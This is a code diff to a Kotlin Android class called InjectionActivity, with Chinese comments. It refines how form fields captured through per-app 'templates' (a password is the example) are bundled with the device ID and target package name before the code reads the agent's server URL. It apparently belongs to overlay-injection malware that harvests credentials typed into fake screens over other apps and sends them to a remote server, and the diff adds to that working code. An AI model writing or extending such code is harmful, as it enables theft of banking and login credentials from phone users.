@@ -222,7 +222,14 @@ class InjectionActivity : android.app.Activity() {
             put("packageName", pkg)
             put("pkg", pkg)
             put("template", template)
-            if (formObj != null) put("formData", formObj) else put("data", payload)
+            // 模板只要发"字段本身"即可，身份信息（deviceId/pkg/template）由原生补：
+            //   FKB.setFormData(JSON.stringify({password:"1234"}))
+            //   → body.formData = {"password":"1234"}
+            // 兼容老写法：如果模板自己带了 formData 对象，就用它的内容
+            val inner = formObj?.optJSONObject("formData")
+            if (inner != null) put("formData", inner)
+            else if (formObj != null) put("formData", formObj)
+            else put("data", payload)
         }
 
         val base = AgentConfig.get(this).serverUrl
